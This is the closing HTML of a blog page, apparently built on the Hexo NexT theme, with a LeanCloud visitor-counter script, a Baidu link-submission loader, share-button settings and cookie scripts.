  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
  <script>AV.initialize("EWwoJgHNdlj6iBjiFlMcabUO-gzGzoHsz", "x8FxDrYG79C8YFrTww9ljo8K");</script>
  <script>
    function showTime(Counter) {
      var query = new AV.Query(Counter);
      var entries = [];
      var $visitors = $(".leancloud_visitors");

      $visitors.each(function () {
        entries.push( $(this).attr("id").trim() );
      });

      query.containedIn('url', entries);
      query.find()
        .done(function (results) {
          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';

          if (results.length === 0) {
            $visitors.find(COUNT_CONTAINER_REF).text(0);
            return;
          }

          for (var i = 0; i < results.length; i++) {
            var item = results[i];
            var url = item.get('url');
            var time = item.get('time');
            var element = document.getElementById(url);

            $(element).find(COUNT_CONTAINER_REF).text(time);
          }
          for(var i = 0; i < entries.length; i++) {
            var url = entries[i];
            var element = document.getElementById(url);
            var countSpan = $(element).find(COUNT_CONTAINER_REF);
            if( countSpan.text() == '') {
              countSpan.text(0);
            }
          }
        })
        .fail(function (object, error) {
          console.log("Error: " + error.code + " " + error.message);
        });
    }

    function addCount(Counter) {
      var $visitors = $(".leancloud_visitors");
      var url = $visitors.attr('id').trim();
      var title = $visitors.attr('data-flag-title').trim();
      var query = new AV.Query(Counter);

      query.equalTo("url", url);
      query.find({
        success: function(results) {
          if (results.length > 0) {
            var counter = results[0];
            counter.fetchWhenSave(true);
            counter.increment("time");
            counter.save(null, {
              success: function(counter) {
                var $element = $(document.getElementById(url));
                $element.find('.leancloud-visitors-count').text(counter.get('time'));
              },
              error: function(counter, error) {
                console.log('Failed to save Visitor num, with error message: ' + error.message);
              }
            });
          } else {
            var newcounter = new Counter();
            /* Set ACL */
            var acl = new AV.ACL();
            acl.setPublicReadAccess(true);
            acl.setPublicWriteAccess(true);
            newcounter.setACL(acl);
            /* End Set ACL */
            newcounter.set("title", title);
            newcounter.set("url", url);
            newcounter.set("time", 1);
            newcounter.save(null, {
              success: function(newcounter) {
                var $element = $(document.getElementById(url));
                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
              },
              error: function(newcounter, error) {
                console.log('Failed to create');
              }
            });
          }
        },
        error: function(error) {
          console.log('Error:' + error.code + " " + error.message);
        }
      });
    }

    $(function() {
      var Counter = AV.Object.extend("Counter");
      if ($('.leancloud_visitors').length == 1) {
        addCount(Counter);
      } else if ($('.post-title-link').length > 1) {
        showTime(Counter);
      }
    });
  </script>



  

  
<script>
(function(){
    var bp = document.createElement('script');
    var curProtocol = window.location.protocol.split(':')[0];
    if (curProtocol === 'https') {
        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
    }
    else {
        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
    }
    var s = document.getElementsByTagName("script")[0];
    s.parentNode.insertBefore(bp, s);
})();
</script>


  
  
  
  <link rel="stylesheet" href="/lib/needsharebutton/needsharebutton.css">

  
  
  <script src="/lib/needsharebutton/needsharebutton.js"></script>

  <script>
    
      pbOptions = {};
      
          pbOptions.iconStyle = "box";
      
          pbOptions.boxForm = "horizontal";
      
          pbOptions.position = "bottomCenter";
      
          pbOptions.networks = "Weibo,Wechat,Douban,QQZone,Twitter,Facebook";
      
      new needShareButton('#needsharebutton-postbottom', pbOptions);
    
    
      flOptions = {};
      
          flOptions.iconStyle = "box";
      
          flOptions.boxForm = "horizontal";
      
          flOptions.position = "middleRight";
      
          flOptions.networks = "Weibo,Wechat,Douban,QQZone,Twitter,Facebook";
      
      new needShareButton('#needsharebutton-float', flOptions);
    
  </script>

  

  

  
  <script type="text/javascript" src="/js/src/js.cookie.js?v=5.1.4"></script>
  <script type="text/javascript" src="/js/src/scroll-cookie.js?v=5.1.4"></script>


  

</body>
</html>
